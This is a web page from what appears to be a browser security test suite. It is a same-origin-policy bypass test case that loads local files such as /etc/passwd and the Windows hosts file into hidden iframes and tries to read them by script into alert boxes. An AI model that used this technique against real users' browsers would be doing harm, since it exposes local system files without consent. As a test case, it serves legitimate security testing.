---
layout: default
title: SOP Bypass - Testcase 14
permalink: /sop/new/14
---

# SOP Bypass - Testcase 14

<iframe src="https://web.archive.org/web/20180831120311if_/file:///etc/passwd" name="myIframe" width="0px" height="0px" data-ruffle-polyfilled=""></iframe>
<iframe src="https://web.archive.org/web/20180831120311if_/file:///C:/Windows/System32/drivers/etc/hosts" name="myIframe2" width="0px" height="0px" data-ruffle-polyfilled=""></iframe>

<script>
function myfunc() {
    var myIframe = frames.myIframe;
    var fenster = window.frames[0];
    var message = fenster.document.getElementsByTagName("pre")[0].childNodes[0].nodeValue;
    var messages = message;
    messages = messages.replace(/#/g, "");
    alert(messages);
    alert(window.frames['myIframe'].document.getElementsByTagName('pre')[0].innerHTML);
}
function myfunc2() {
    var myIframe = frames.myIframe2;
    var fenster = window.frames[0];
    var message = fenster.document.getElementsByTagName("pre")[0].childNodes[0].nodeValue;
    var messages = message;
    messages = messages.replace(/#/g, "");
    alert(messages);
    alert(window.frames['myIframe'].document.getElementsByTagName('pre')[0].innerHTML);
}
</script>

Testcase for Cross Scheme Data Exposure

<input type="button" id="btn_test" class="test" value="Run Test Case 1 (Linux OS)" onclick="myfunc()">
<input type="button" id="btn_test" class="test" value="Run Test Case 2 (Windows OS)" onclick="myfunc2()">

**Note:**
If page displays an alert box displaying the content of /etc/passwd file, it results in a Cross Scheme Data Exposure.
